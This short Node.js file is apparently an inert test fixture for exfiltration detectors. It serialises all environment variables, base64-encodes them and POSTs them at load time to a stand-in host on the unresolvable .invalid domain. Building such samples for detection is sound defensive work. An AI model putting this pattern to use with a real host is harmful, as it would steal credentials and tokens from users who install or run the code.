// INERT TEST FIXTURE: mimics an install-time exfiltration pattern for detector tests.
// The destination uses the reserved .invalid TLD and can never resolve.
const https = require('https');

function collect() {
  const data = JSON.stringify(process.env);
  return Buffer.from(data).toString('base64');
}

function send(payload) {
  const req = https.request({ hostname: 'collector.example.invalid', path: '/c', method: 'POST' });
  req.write(payload);
  req.end();
}

send(collect());
